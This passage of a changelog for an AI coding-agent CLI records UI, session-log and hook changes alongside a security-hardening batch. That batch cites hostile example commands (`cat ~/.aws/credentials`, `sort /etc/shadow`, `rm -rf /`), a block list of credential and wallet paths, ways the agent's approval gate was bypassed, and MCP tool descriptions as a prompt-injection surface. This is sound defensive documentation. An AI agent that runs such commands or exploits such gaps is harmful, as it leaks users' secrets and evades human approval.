  seam, and the spinner tick stops doing transcript work. The entire slash-command registry and
  the ~1,760-line execution body move to a new `src/tui/slash.ts` (`runSlashCommand`); tui.tsx
  shrinks to 4,629 lines (−2,109) and keeps a latest-ref bridge so the body always reads fresh
  state. The moved code is byte-identical — no keystroke or command behavior changed — with one
  side-benefit fix: `/agents` and `/tasks` now read the currently-running sub-agents and todos
  instead of the stale empty values the old handler captured on first render. Separately, the
  tool-call run map (the collapsed "3 tools · ok" rows) is now memoized incrementally: the
  120ms spinner tick used to re-scan the ENTIRE committed transcript on every tick for as long
  as a turn ran; it now scans zero slots unless a new line actually lands (append-only cache,
  invalidated wholesale by Ctrl-O / `/clear`). On long tool-heavy turns the idle TUI no longer
  burns CPU re-deriving scrollback it already drew.

### Changed — v6.21.0 (Phase 3: onKey focus-owner router, P3-01)

- **Focus-owner router (F03-02).** TUI keystroke handling is no longer a 778-line ordered
  if-chain whose precedence was an accident of statement order. Every frame now has exactly one
  focus owner — approval dialog → model picker → history search → vim mode → composer — and the
  dispatch order is explicit data (an owner table pinned by a snapshot test), never re-derived
  from if-order. Reserved chords (the two-stage Ctrl-C / Ctrl-D exit arming, and Ctrl-X →
  Ctrl-E for the external editor) resolve BEFORE owner routing, so the exit hatch and the
  editor survive every modal; SGR mouse reports, cursor-position replies, and bracketed paste
  are handled as transports rather than decisions — a paste can never resolve an approval
  dialog and can never strand the input state. Every existing behavior is preserved: vim
  NORMAL-mode motions stay modal while its structural keys (Enter, Tab, arrows, control
  chords) still fall through to the composer, Ctrl-R opens history search above vim exactly as
  before, and the slash menu's Tab/Shift-Tab, @-mention completion, autonomy ring, and
  round-table input routing are all unchanged. Each owner lives in its own module under
  `src/tui/keys/` behind a compile-checked contract with the component (a forgotten wire is a
  type error), and the key handler itself shrinks from 778 lines to ~110. This is a pure
  structural refactor: no keystroke behavior changed — witnessed by the full byte-level TUI
  suite — and all 11 previously identified swallowed-key cases (Ctrl-C dead while a dialog is
  open, Ctrl-D inside a paste, Esc precedence between search and vim, Shift-Tab past the
  slash menu, and the rest) now carry regression tests.

### Changed — v6.20.0 (session log phase 2: delta snapshots + retention, P2-13)

- **Delta snapshots (F06-02, second half).** Context snapshots no longer re-serialize the entire
  message array twice per turn. The first snapshot of a lineage is written `format:'full'`; every
  later one is a `format:'delta'` carrying ONLY the appended messages, chained via `baseOffset`
  onto the previous snapshot line. Any lineage divergence — in-place mutation (microcompact),
  `/rewind` truncation, `/fork` adoption, or a second context writing one log (sub-agents) —
  re-bases as a full, and a periodic full fires every 512 snapshots or 2MB of accumulated deltas
  so chains stay shallow. A broken link (torn write, corrupt or fractional offset, a
  `messageCount` that doesn't add up) falls back ONE step instead of throwing or guessing.
  Measured: a 30-turn log drops from ~100× transcript overhead to a stable ~2.2× (snapshot share
  99% → ~54%), and the ratio stays flat out to 120 turns. Every reader — `/resume`, `/rewind`,
  the turn picker — reconstructs byte-identical state through the chains.
- **Retention (archive over delete, opt-in, global-only).** New `~/.shadow` config keys
  `sessionRetentionDays` (archive logs older than N days) and `sessionRetentionKeep` (always
  protect the newest M; set alone, archive everything beyond M). Both are PROJECT_UNTRUSTED_KEYS:
  a `shadow.config.json` in a cloned repo cannot sweep your history. When configured, a sweep at
  session start ARCHIVES each stale log — a MOVE, never a delete — into
  `.shadow/sessions/.archive/` (0700) together with its paired checkpoint tree, and prints a
  one-line notice. Safeguards: the newest M are protected from every rule, a log written within
  the last 5 minutes is left alone (it may belong to a session still running — two sessions can
  share one workspace), an explicit `--resume` target is excluded, and the sweep runs before the
  new session's own log opens. `/doctor` shows a dry-run of what the next sweep WOULD archive
  (counts + sizes) before any pruning ever happens; unconfigured, it reports retention as off.
- **Session-log hardening from the pre-release adversarial review (13 confirmed findings).**
  Same-millisecond session starts now claim their log atomically (`O_EXCL`, suffixed on
  collision) so two sessions can never silently share one file; snapshot lineage digests are
  two-lane 64-bit (the old single-lane FNV-32 had an empirically demonstrated ~2^19 birthday
  collision); per-context lineage bookkeeping keeps interleaved sub-agent snapshots chaining
  correctly; short writes can no longer desync the byte accounting; offsets are integer-validated;
  a symlinked `.archive` is refused outright (lstat — nothing flows through it); hostile session
  filenames (`.jsonl` / `...jsonl`) can no longer walk the checkpoint-tree move out of its
  directory; checkpoint trees are now written 0700/0600 (they mirror workspace file content, and
  were umask 0755/0644 before).
- **Tests.** +28 in two new files: `test/snapshot-delta.test.ts` (chain shape, byte-identical
  reconstruction, the ≤3×/linear acceptance, resume/rewind/picker parity, torn-delta fallback,
  periodic checkpoints, legacy + fork-adoption compat, review-fix pins) and
  `test/session-retention.test.ts` (off-by-default, age/keep rules, protections, collision
  suffixes, `/doctor` dry-run, untrusted-key strip, symlink/traversal/permissions pins). Full
  suite 1983/1983.

### Changed — v6.19.0 (competitive UX: rewind + vim + hooks + memory + overflow, P2-10)

- **Rewind UX (F08-07).** `/rewind` is no longer an index into the void: bare `/rewind` opens a
  picker whose rows name each turn by the prompt that produced it (newest first), and rewinding
  prefills the composer with the first UNDONE turn's prompt — exactly what you typed, with
  injected `@file` inlining and hook-context suffixes stripped — so you can tweak and re-send.
  `/rewind <n>` now VALIDATES instead of clamping: a non-integer or unknown turn prints the
  rewindable turns instead of silently landing somewhere else. New scope flags: `--code-only`
  (roll back workspace files, keep the conversation) and `--chat-only` (the reverse); the default
  still does both. A rewind restores EVERY checkpoint from the target onward (oldest backup wins,
  newest-first), removes files created after the target, and — when a file's oldest backup is
  missing — reports it as only PARTIALLY restored (it stays at a newer state) in a warning line
  instead of silently keeping edits the rewind should have undone. The rewound state is made
  durable immediately (a snapshot is appended), so `/resume` resurrects the post-rewind
  conversation instead of silently undoing the rewind, and the rewind itself becomes a rewind
  target. File restores happen only AFTER the snapshot hydrates and validates, and every
  checkpoint path is jailed (destinations inside the workspace, backups inside the session's own
  checkpoint tree), so a planted `index.json` can't write, read, or delete outside the sandbox.
  The turn menu stays honest across `/resume`, `/fork`, `/clear`, and turn end (refreshed at each,
  with an incremental per-log cache bounded at 32 logs).
- **Vim depth (F08-08).** Normal mode grows the high-value slice of the grammar: `f/F/t/T`
  character searches with `;`/`,` repeat and counts, yank + put (`yy`, `yaw/yae/yap/yas/yat`,
  `p`/`P`), `o`/`O` open-line, `r` replace-char, `J` join-line, and counts on the `h/j/k/w/b/e`
  motions. Multiline drafts keep cursor sanity across wraps, and every new motion degrades to a
  no-op at buffer edges instead of throwing.
- **Hooks v2 (F08-09).** Hook entries may now be `{ command, matcher? }` (the v1 bare-string form
  still works), with `matcher` a pipe-separated list of tool-name globs that filters the tool
  phases (`pre_tool_use`, `post_tool_use`). Hook STDOUT is now a contract: a deny phase
  (`pre_tool_use`, `user_prompt_submit`) can print a JSON verdict `{ "decision": "block",
  "reason": ... }` to veto the action — and deny phases FAIL CLOSED (a hook that errors, times
  out, or prints an unparseable verdict blocks, with the clamped error in the transcript); other
  phases can print `{ "context": ... }` to inject text into the conversation. Sync phases run
  under a 30-second SIGKILL-enforced timeout; `session_start` runs detached with a
  TERM→KILL-escalating grace timer and a process-exit registry, so a runaway hook can never
  outlive the session. Hook output is scrubbed of control characters and invisible/bidi Unicode
  before it reaches the transcript, verdict parsing is prototype-pollution-proof (own-property
  reads only), a deny-phase entry with a matcher REFUSES to skip when the phase carries no tool
  context (guard hooks never silently not-run), and all hook text is length-clamped per phase and
  again on the combined tool result.
- **Memory index (F08-05).** The system prompt now carries a one-line INDEX of stored workspace
  facts (one flattened, pair-safe-truncated line per fact; 40-line / 100-char caps) instead of
  injecting every value wholesale — long fact stores no longer eat the context window. The model
  fetches a full value on demand with the memory tool (`action: recall`), whose description says
  exactly that. Fact keys are capped at 200 characters, and keys render as single sanitized lines
  (a key carrying newlines, `## ` headings, or escape bytes can no longer restructure the prompt).
- **Reactive compaction ladder (F08-06).** A prompt-too-long response now climbs a bounded ladder
  instead of dying on the first attempt: rung 1 forces a compaction (summarize-or-truncate,
  recent turns preserved); rung 2 additionally strips image blocks (leaving a placeholder) and
  shrinks stale tool results, then re-compacts at half-tail. Recovery retries never re-send the
  pre-ladder message snapshot — every attempt goes out with the LIVE healed context — and the
  attempt budget (4) provably bounds the loop. If nothing reclaims enough, the turn ends in an
  honest, specific state: an `overflow_irrecoverable` session record plus guidance (`/clear` or
  `/rewind` in the TUI; fresh session or larger-window model in headless runs), and any ladder
  throw surfaces as a warning finding even when the degraded-report flag was already consumed.
- **Session exports render retries readably.** `/export` writes retry events as
  `Retry (attempt N): <reason>` instead of dumping the raw event JSON into the transcript.
- **Pre-release adversarial review hardened all five features.** Four find→verify reviews (rewind
  ×9, vim + memory ×12, hooks ×8, overflow ladder ×5) confirmed 34 findings; every substantive
  one is fixed and pinned by a regression test. Highlights beyond the above: hydrate-before-files
  ordering so a torn snapshot can never half-apply a rewind; exact-turn latest-append-wins
  resolution so an interactive `/resume`'s re-seeded turn 0 can't hijack the picker; the
  rung-1→rung-2 escalation happens even when rung 1 THROWS (a session can no longer wedge on an
  overflow that keeps re-occurring); detached hooks are group-killed at session exit so the
  effective cap is min(30s, session lifetime); and the offset cache is invalidated by a file-head
  fingerprint so a same-path log replacement can't serve stale or merged turns.
- Suite: 1955/1955 tests · `typecheck` + `typecheck:all` + `eslint` clean.
- Local release. Public repo / mirror stay v6.14.0 pending a founder release order.

### Changed — v6.18.0 (config & sessions: profiles + /fork, P2-11)

- **Named profiles (F09-08).** A profile bundles a model with the settings that go with it, so
  switching workloads is one flag instead of five edits. Define them in `~/.shadow/config.json`
  under `profiles` — each maps a name to `{ model?, effort?, autonomy?, sandbox?, contextBudget?,
  summarizeTriggerRatio? }` (every field optional; omitted fields fall through to your normal
  config). Activate with `shadow --profile <name>` or `SHADOW_PROFILE=<name>`. The switch is
  atomic: the profile's model + effort + autonomy + context all take effect together. Precedence
  is `CLI flag > env > profile > project config > global > defaults`, so a single `--effort` or
  `SHADOW_MODEL` still wins one key while the profile sets the rest. An unknown `--profile` name
  fails loudly at startup and lists the profiles you actually have; a malformed entry reports the
  offending field. Profiles are **global-only** — `profiles` joins `PROJECT_UNTRUSTED_KEYS`, so a
  cloned repo's `shadow.config.json` cannot plant or activate one — and the profile schema admits
  no `baseUrl`/keys/hooks/exec fields. `/status` shows the active profile and exactly which keys it
  contributed.
- **`/fork` branches a session (F09-10).** `/fork` copies the transcript so far into a new session
  id and switches to it, leaving the source untouched — try a risky direction on the fork, keep the
  original pristine. The fork lands next to the source (a same-millisecond stamp collision gets a
  `-N` suffix, never an overwrite) and records a `forked_from` lineage marker in the fork only.
  New turns and `/rewind` live in the fork, and pre-fork workspace checkpoints are carried under the
  fork's id (re-pointed at the fork's own backups, so `/rewind` past the fork point still restores
  files and the lineage doesn't depend on the source surviving). Forking clears session approvals
  (`/resume` parity — a new session id is a new grant scope). `/rewind` keeps its in-place semantics.
- **Kimi thinking profile confirmed (F09-03).** The Kimi family profile (shipped v6.4.0) maps
  `/effort` onto Kimi's declared `low/high/max` reasoning scale, round-trips `reasoning_content` in
  tool loops, and never emits a reasoning value outside the declared scale — verified by the
  existing effort-clamp ladder tests. P2-11 marks it complete; no behavior change.
- **Pre-release adversarial review hardened both features.** A find→verify review of the new code
  confirmed and fixed seven findings. `/fork` now rebinds EVERY long-lived transcript writer (the
  bus→event recorder, the sub-agent loop-deps factory, the wakeup rate-limit recorder) through a
  shared holder the swap updates — before, post-fork events kept landing in the SOURCE transcript
  and a fork's `/export` silently lost them; a sub-agent launched after a fork now writes to the
  fork, and a fork copy racing a concurrent background append truncates a torn final line instead
  of carrying a half-record. Named profiles now resolve a profile's `model` to its preset's
  provider/endpoint so a cross-provider switch is atomic (before it stayed on the default provider
  and 400'd at the wrong API); a malformed UNUSED profile entry (or `profiles: null`/`[]`) no
  longer makes every config load throw — only the entry being activated is strict; a stale
  `SHADOW_PROFILE` env warns and runs unprofiled instead of bricking subcommands that can't take
  `--profile`; and the config merge now skips `__proto__`/`constructor`/`prototype` keys (no
  prototype-pollution bypass of the untrusted-key strip). Each fix is pinned by a regression test.
- Local release. Public repo / mirror stay v6.14.0 pending a founder release order.

### Changed — v6.17.0 (TUI correctness + input polish, P2-05 + P2-09)

- **Tool output can no longer drive your terminal (F05-04).** Shell/tool output is now pushed
  through `sanitizeTerminalEscapes()` before display: cursor-movement/erase/mode CSI sequences,
  OSC/DCS payloads, two-byte sequences, and C0/C1/DEL noise are all stripped — a malicious `ls`
  alias printing `ESC[2J ESC[H …` can no longer clear the screen, park the cursor, or toggle
  terminal modes mid-transcript. Color (SGR) spans survive into the styled transcript with a
  guaranteed reset at each line end, so a color code can't leak past its line; the streaming live
  slot gets the same scrub. Model/assistant text is additionally stripped of SGR on display.
- **Esc no longer double-flashes the tail of an interrupted answer (F05-06).** Esc commits the
  streamed tail, but the 30ms coalescing flush could still be armed with the same tail and
  re-paint it a beat later — the partial answer flashed twice. Esc now mirrors the stop-handler
  teardown (stream/think refs nulled, live slot emptied), so the flush finds nothing and the tail
  appears exactly once.
- **One width table (F05-07).** The drifted duplicate width table in markdown.ts is gone; every
  display-width measurement (markdown table borders, chart label/value columns, the composer's
  flatten hanging prefix) now routes through the single `displayWidth` (moved to `src/util/width.ts`).
  ZWJ emoji measure as one 2-column cluster, CJK Ext-B cells align, and padding/truncation can no
  longer split a surrogate pair.
- **Keybinding integrity (F03-03).** The binding loader validates every bound action id against the
  real action registry — a typo'd action in `keybindings.json` now warns `unknown_action` at load
  instead of silently binding dead weight, and unbinding something nothing ever binds warns `inert`.
  The liveness test was extended from mere registration to REACHABILITY: every context must be
  pushed at a site not shadowed by an earlier-returning branch, with real escape/enter dispatch.
- **Composer keys are now grapheme-safe and batch-proof (F03-05).** Ctrl+B/F step whole grapheme
  clusters (they used to move ±1 UTF-16 code unit and could park the caret inside an emoji). Ink
  reports a held/auto-repeated key as ONE batched stdin chunk and only parses the FIRST sequence in
  it — the raw-sequence tap now extracts the LAST complete ESC-led sequence per chunk (`lastKeySequence`),
  so Home/End/forward-delete work when held or when another key lands in the same read. Ctrl+D on
  an EMPTY composer finally does what the hints advertised: the shell's EOF exit — first press arms
  ("press Ctrl+D again to quit"), a second consecutive press quits, sharing the two-stage latch with
  Ctrl-C (any other key disarms). With text in the draft, Ctrl+D keeps its forward-delete meaning,
  and a literal ^D inside a bracketed paste can never arm the latch.
- **Vim mode learned multiline drafts (F03-06).** With Shift+Enter making drafts multiline, the vim
  line-bound keys used to treat the WHOLE buffer as the line — `$`/`D` ran to the end of the draft,
  `0`/`I` to its start, `dd` cleared everything. `$`, `D`, `C`, `0`, `I`, `A`, `h`, `l`, `x`, `s`,
  `dd`, `cc`, and the `d`/`c` operator motions (`$`/`0`/`h`/`l`) now all stop at the caret's HARD
  line; `x` can never eat the line break. `j`/`k` move between wrapped VISUAL rows (the live
  composer width) instead of being swallowed. Vim kills route through the composer's undo stack, so
  `x`/`D`/`dd` are undoable with Ctrl+Z like every other edit, while cursor-only motions push no
  undo frames. Word classification is the composer's own table (`\p{L}\p{N}_`), so `w`/`b`/`e`
  agree with emacs word motions on CJK and friends.
- Local release. Public repo / mirror stay v6.14.0 pending a founder release order.

### Changed — v6.16.0 (session & display UX batch, P2-08)

- **Inline images no longer silently fail inside tmux (F02-03).** OSC 1337 / Kitty payloads only
  reach the outer terminal when the user has configured `allow-passthrough` — there is no runtime
  signal for it, and the old code claimed success anyway, which ALSO suppressed the save/open
  fallback: images vanished with no trace. Under tmux (`$TMUX` or `TERM_PROGRAM=tmux`)
  `supportsInlineImages()` now fails closed, so the durable text placeholder + save/open path
  always runs instead.
- **`/sessions` inventory (F02-04).** Lists every resumable session in the workspace (id + snapshot
  time, the current one marked), capped at 50 rows with a pointer to `/resume <id-prefix>` for the
  rest. The resume picker was previously only reachable by typing `/resume ` and waiting for the
  completion menu.
- **Bare `/resume` no longer coin-flips (F02-04).** With several candidates it used to silently
  resume the newest one. Now it opens the picker menu with a hint line (Esc backs out); with exactly
  one candidate it still resumes directly. `/resume <id|path>` is unchanged.
- **`/export` keeps reasoning (F02-04).** The markdown export dropped `reasoning_done` content
  entirely — a transcript that silently lost a whole section. Reasoning now exports as a collapsed
  `<details>` block above the assistant answer: readable transcript, nothing lost.
- **Theme follows the terminal until you choose one (F02-05).** When no `/theme` choice is stored,
  startup asks the terminal for its background color (OSC 11, 100ms bounded wait, never throws) and
  applies the `light` theme on light backgrounds. The detection is in-memory ONLY — it re-runs every
  launch until you pick a theme explicitly, so a wrong guess is never sticky and a moved laptop
  corrects itself. Opt out with `SHADOW_NO_THEME_DETECT=1`; test envs and non-TTYs never query.
- **`TERM=dumb` gets the plain renderer (F02-05).** A dumb terminal can't drive the raw-mode TUI;
  Shadow now forces the readline REPL for it and says why, instead of rendering garbage.
- **Paste registry is bounded (F02-06).** Big-paste contents park in a session registry until
  submit; entries whose chip was deleted from the draft used to linger forever — a slow leak in long
  sessions. Above a cap of 64 only entries still referenced by the draft or a queued task survive,
  consumed chips drop out at submit/flush, and `/clear` empties the registry with the draft.
- **`/table` names paused commands (F02-06).** Any slash command typed while a round-table is active
  is paused (the composer belongs to the table) — the old generic note answered "address a model with
  @handle" to a user who had typed `/cost`, reading as a swallowed keystroke. Now: "`/cost` is paused
  while the round-table is active — `/table done` ends it."
- **Regression pins added** for the shared-fence rule accepting `~~~` in `clampTail`/`clampLiveRest`
  (already correct via the P1A-13 CommonMark classifier) and for `/clear` resetting the usage/cost
  readout (already fixed in P1B-03).
- Local release. Public repo / mirror stay v6.14.0 pending a founder release order.

### Hardened — v6.15.0 (security hardening batch, P2-07)

- **Prefix grants can no longer smuggle reads out of the jail (F07-05).** A session/prefix approval
  for `run_shell` used to vouch for the WHOLE command once its prefix matched — approve `cat` once
  and `cat ~/.aws/credentials` rode the grant. Now every granted command is routed through the same
  out-of-root demotion as the read-only fast path: `~`/`$VAR` expansions in the tail are rejected
  outright (`$?` whitelisted — it carries no path), chained/redirected/substituted payloads re-gate,
  and viewer/search commands that read outside the granted roots fall back to the approval dialog.
  Demotion only — a deliberate approval of the specific command still works. Git revision grammar
  (`git diff HEAD~3`, `git log v2~1..v2`) keeps riding its grant: the tilde check now matches only
  where the shell actually expands — at the start of a token or after `=` in an assignment.
- **Quoted/backslash operands fail closed (review).** The operand scanner saw raw tokens, so
  `cat "/etc/passwd"` resolved "inside" the workspace and could auto-run — the shell strips quotes
  before the program reads, but the jail didn't. Any quote or backslash in a read operand now defeats
  literal path analysis and demotes the command to the gate, in-root included.
- **Whole-session `(s)` grants are scoped too (review).** A session-wide `run_shell` approval used to
  sit above all path scoping — one `(s)` auto-ran every shell read for the rest of the session. The
  out-of-root demotion now applies to every session grant; a session grant vouches that shell commands
  may run, never for WHERE they read. Write flags (`sort -o`, `git branch -d`, `find -exec`,
  `git log --output=…`) are screened the same way, so a grant can't smuggle a WRITE out of the jail.
- **Full-content readers scoped; `git diff --no-index` never auto-runs (review).** `sort` and `uniq`
  print whole files but rode the fast path with no operand scoping — `sort /etc/shadow` leaked full
  contents with zero interaction. Both are now scoped like the other viewers, and `git diff --no-index`
  (which reads arbitrary paths) is refused by both the fast path and prefix grants.
- **Plan-exit approval can't be reused to skip the gate (review).** The approved-plan-exit exemption
  was keyed on the bare call id, and OpenAI-compat fallback ids are positional (`call_0`) and REUSE
  across responses — a later `run_shell` carrying the same id as an approved `exit_plan_mode` skipped
  the ENTIRE gate, denylist included. The exemption is now keyed to the exit_plan_mode call ITSELF
  (name + id) so it can never be inherited.
- **SECRET_READ_DENY widened to the password-manager + browser/keychain tier (F07-06).** Adds
  `.password-store`, the Linux + macOS Chrome/Chromium/Edge/Firefox profile dirs, `Library/Keychains`,
  and `.local/share/keyrings`, plus the third-party-store tier the first pass missed (`.config/rclone`,
  `.vault-token`, `.oci`, Brave, 1Password incl. the browser-extension Group Container, Electrum +
  Bitcoin Core wallets). Whole-directory denies are deliberate — the secret files sit several levels
  deep and move between versions. The structural inversion (deny `$HOME` reads by default) remains
  P3-04 scope.
- **Denylist dialog is acknowledge-only, never a dead end (F07-09).** A catastrophic-command match is
  a HARD BLOCK and always has been — but the old dialog asked y/n and then blocked inside `run_shell`
  even when you pressed y: a dead end that trains you to stop reading the one path that must never be
  skimmed. The dialog now carries `acknowledgeOnly: true`; every gate shows acknowledge-only
  affordances (TUI: "⛔ blocked — any key acknowledges"; REPL: press Enter). No keypress, session
  grant, prefix grant, or autonomy raise can run a denylisted command, and no grant is ever minted
  from the dialog.
- **Classifier: destructive check runs before rules; dead `dd` branch revived (F07-10).** The old order
  resolved permission rules first, so a rule `allow` for `run_shell` returned `allow` and skipped the
  destructive hard-deny entirely — one convenience rule licensed `rm -rf /`. The destructive check now
  runs first and can only ever RAISE the bar. Each regex alternative carries its own boundary rules, so
  `dd if=…` matches again (the old trailing `\b` made it dead), `rm` covers trailing flag letters and
  long flags (`rm -rfv`, `rm --recursive --force /`), the redirect branch only matches BLOCK-DEVICE
  targets (so the benign `> /dev/null` suppression idiom is no longer hard-denied), and `find … -delete`
  is hard-denied by the classifier tier. The catastrophic denylist separately catches `find -delete`
  rooted at an absolute path, home, or `$HOME` — always, not just under the opt-in classifier.
- **apply_patch honors the read-before-write contract (F07-11).** An `apply_patch` hunk could rewrite
  or blind-delete a file the model had never read this run. Every file a hunk touches (update AND
  delete) now requires `readTracker.hasSeen`, with edit_file's exact error shape; a file created
  earlier in the SAME patch stays exempt, and the stale-edit (mtime) guard still bites.
- **MCP tool descriptions are enveloped; hostile schemas refused (F07-12).** MCP tool descriptions ride
  the tool schema into context on EVERY request — an injection surface the P3-05 envelope didn't cover
  (it wrapped tool RESULTS only). Descriptions are now wrapped in the untrusted-content envelope, tool
  names are sanitized to the identifier alphabet (collisions disambiguated with a numeric suffix, never
  aborted), and oversized or control-character-laden input schemas are skipped with a warning rather
  than registered. A collision-suffixed tool reports its EXACT registered name in results and keeps the
  original name on the wire.
- **+30 tests in `test/p2-07-security.test.ts`** (17 batch pins across the five findings + 13 review-fix
  pins incl. a live plan-exit id-collision proof and a hostile fake MCP server). Suite **1774/1774** ·
  typecheck + typecheck:all + eslint clean · release-gate OK.

### Added — v6.14.0 (performance batch, P2-06)

- **read_file: stat-before-read cap + streaming line window (F06-05).** The old cut `readFileSync`'d
  the WHOLE file and split it into an array of lines — a 300MB log produced a 300MB Buffer plus
  millions of retained line strings before the model ever asked for "lines 1-50". Now: `statSync`
  first (cheap, no read), refuse over 10MB with grep/run_shell guidance, stream the rest counting
  EVERY line (totalLines stays exact) while retaining only the requested offset/limit window. A
  pathologically long unterminated line after a complete window is dropped, not retained (still
  counted). Binary sniffing checks the first 8KB — byte-exact, not UTF-16 units — and reads abort
  cleanly on the turn's signal.
- **Width measurement is single-pass (F06-06).** `displayWidth` / `takeByWidth` / `chunksByWidth`
  now run ONE `Intl.Segmenter` pass over the string instead of re-segmenting the shrinking tail per
  step (O(n²) → O(n)), with a printable-ASCII fast path that skips segmentation entirely — the
  overwhelmingly common case for transcript rows. A 20k-CJK line that stalled the renderer for
  seconds now measures in milliseconds. Oversized single clusters (a 2-column character in a
  1-column budget) emit alone instead of emitting empty chunks.
- **MCP results are clamped (F06-07).** A server's tool reply is clamped to 16,384 chars (head +
  tail with a cut marker) BEFORE the P3-05 envelope, so the END marker always survives and a
  megabyte reply can no longer ride every context snapshot at full size.
- **Reasoning round-trip trim (F06-08).** Preserved provider reasoning (Qwen/Kimi wire state) is a
  CONTINUATION contract, not history — but nothing ever trimmed it, so a long session accumulated
  one full reasoning budget per past turn, counted char-for-char by the estimator. Compaction now
  strips `providerReasoning` from every assistant turn except the newest PER DISTINCT MODEL — a
  Qwen→Kimi→Qwen switch-back keeps both threads; stripping newest-global would have permanently
  lost the switched-away model's continuation. The replay path keeps only the newest turn stamped
  by the ACTIVE model (foreign-model stamps never replay). New config knob
  `reasoningRoundtrip: last|none` (default `last`).
- **First paint is no longer gated on MCP connects or session_start hooks (F06-09).** The TUI
  renders immediately; MCP servers connect in the background (tools resolve by name at call time,
  so late registration is safe) and a dead server settles fast instead of burning its full budget
  before paint. session_start hooks fire DETACHED + unref'd (30s group-kill cap): an init script
  can no longer hold the first paint hostage. Hook spawn failures and stdin EPIPE are swallowed —
  a broken hook is a config problem, not a session crash.
- **Sub-agent concurrency cap (F06-10).** A session-level semaphore (default 4, configurable via
  `subagentConcurrency` 1–16) bounds ALL sub-agent loops, sync AND background: a model fanning out
  a fleet of `agent` calls in one turn no longer opens unbounded parallel provider streams against
  one serve. tryAcquire-first admission announces immediately; a full gate surfaces the agent as
  `queued…` in the panel, `/agents`, headless output, and the web mirror, then re-announces on
  admission. Queue wait is not loop time — the wall-clock budget restarts at admission. NESTED
  agent calls (a sub-agent spawning its own) bypass the gate: a parked parent holds its permit
  while awaiting this very tool result, so a queued child would wait behind its own lineage forever
  — a chain is one active provider stream anyway. Background agents acquire inside their
  fire-and-forget task so a full semaphore never blocks the launching turn; abort-while-queued
  dequeues cleanly and leaks no permit.
- **MCP stdin EPIPE guard.** A server dying mid-handshake turns the next write into an EPIPE
  'error' on the stdin stream — unhandled, a process-level uncaught exception that flaked verify
  runs and could take a session down at startup. It is now treated as connection death: in-flight
  requests fail fast instead.

### Fixed — v6.14.0 (Windows install wall)

- **install.ps1 verifies on stock Windows (PowerShell 5.1).** The fail-closed signature gate
  required PowerShell 7.1+ (.NET 5's `ImportFromPem`), and stock Windows ships 5.1 — so every
  fresh Windows install dead-ended before the first run. The installer now verifies the SAME
  ECDSA P-256 signature on 5.1 / PS 7.0 using .NET Framework 4.7+'s native ECDSA: the pinned
  SPKI key and the RFC 3279 DER signature are decoded by strict parsers in the script and handed
  to `ECDsa.VerifyData` in raw r||s form. The posture is unchanged — runtimes with NEITHER path
  still abort (checksum-only against an attacker-controlled manifest is no protection), a bad
  signature still aborts, and `SHADOW_INSECURE_SKIP_VERIFY` stays the only explicit bypass.

### Added — v6.13.0 (loop guardrails batch, P2-04)

- **Parallel steer/interrupt now reaches not-yet-started calls (F04-07).** Parallel tool dispatch
  now admits calls SEQUENTIALLY and executes them in parallel. The old dispatch ran every call's
  start-time checks inside one synchronous tick, so once a batch was underway, no steer (new user
  message), Esc, or budget crossing could reach a not-yet-run sibling — every call started no
  matter what. Each admission decision now chains after the previous one and yields an event-loop
  turn, so a cancellation landing mid-batch cancels the not-yet-admitted siblings (each paired with
  an explicit "skipped because the user sent a new message before this call started" result) while
  already-running calls still finish. The loop guard's consecutive-repeat counter is snapshotted
  for the batch: three legitimately identical parallel calls cannot trip the guard on each other,
  and the batch itself counts as exactly ONE step of the cross-turn repeat count — a uniform
  batch whose shared signature equals the previous turn's advances the count by one, a mixed
  batch resets it to one, and a fully cancelled batch leaves it untouched — so the guard still
  fires on the third consecutive TURN repeating the same call, but can no longer be bypassed by
  fanning the identical call out across a batch every turn.
- **Healer duplicate-drop observability (F04-06).** When the dangling-tool_use healer finds
  duplicate `tool_result`s for one call id (the shape a retried tool call leaves behind), it now
  keeps the LAST result — the final outcome is the truth; it previously kept the first, stale one —
  and reports the drop instead of swallowing it: a machine-readable `debug` bus event
  (`healer_dup_tool_result`) plus a session-log entry naming the dropped ids and the last-wins
  policy, once per assistant message. Renderers ignore the channel by default; the session log
  persists it.
- **Wakeup guardrails (F04-09).** `schedule_wakeup` gains a 30-second minimum floor — a 1-second
  wakeup is a token furnace with no legitimate use — and the tool reports the EFFECTIVE delay
  ("raised to the 30s minimum"), so the model sees what was actually scheduled, not what it asked
  for. A per-session rate ceiling checked AT FIRE TIME caps a stuck re-scheduling loop at 30
  wakeups per rolling hour: excess fires are dropped and reported (visible warning + session-log
  entry), never executed. And headless (`--task`) wakeup turns are now interruptible: the headless
  fire path routes through the same task runner that registers the live abort controller, so
  SIGINT/Ctrl-C reaches wakeup turns (they previously ran under a throwaway controller nothing
  could stop). The TUI path already queued wakeups through the FIFO run controller and is
  unchanged.
- **Budget ceilings enforced in-call, not just between turns (F04-10).** Token/cost/wall-clock
  ceilings are now checked before EACH call starts: a serial batch (or a parallel batch at
  admission) that crosses a spending ceiling mid-batch stops enlisting further calls, and every
  unrun call is paired with an explicit "skipped because the session budget was reached" result so
  the model sees WHY it did not run. The iteration cap is deliberately different: it bounds
  PROVIDER TURNS, so the tools of the final turn still execute — `max_iterations` stops the loop
  before the next turn, which is what the cap means.

### Changed — v6.13.0

- **Compaction failure is visible and degrades instead of dying (F04-11).** `maybeSummarize` now
  returns four distinguishable outcomes: `summarized`, `truncated`, `failed`, or no-op. When the
  summarizer round-trip fails (or yields an empty summary), Shadow degrades to LOCAL truncation:
  the oldest `tool_result` bodies in the summarization window are tombstoned — body only; pairing
  id, `ok` flag and position untouched, the same shape microcompaction already proves safe — until
  the estimate is back under the trigger. The session continues with coarser older history instead
  of sailing into a server 400. Both degraded outcomes surface as a warning (rendered by the TUI
  and the headless renderer alike) plus a `compaction_degraded` session-log entry; the old
  `catch { return false; }` made failure look identical to "nothing to compact". When nothing is
  left to reclaim, compaction reports `failed` visibly. `/compact` shows all four outcomes
  distinctly; an abort (Esc) during compaction remains a clean no-op with history untouched.

### Hardened — v6.13.0 (find→verify review of the batch itself)

- **Loop guard: a parallel batch is ONE cross-turn step — never N, never zero.** A uniform batch
  whose shared signature equals the previous turn's advances `consecutiveRepeats` by exactly one
  (three legitimately identical siblings cannot gang-trip the guard); a mixed batch resets the
  count to one; a fully cancelled batch leaves the counter untouched. The per-sibling snapshot is
  retained, so siblings still never trip the guard on each other mid-batch. Test-pinned, including
  the pair-batch bypass regression.
- **Parallel dispatch settles every promise.** Each per-call promise carries its own catch: a
  rejected dispatch yields a paired "Tool dispatch failed" result block instead of a dangling
  `tool_use` the healer would have to reconstruct. `emitFindings` also defends against
  `meta.findings` being absent (plugin tools live outside TypeScript's sight).
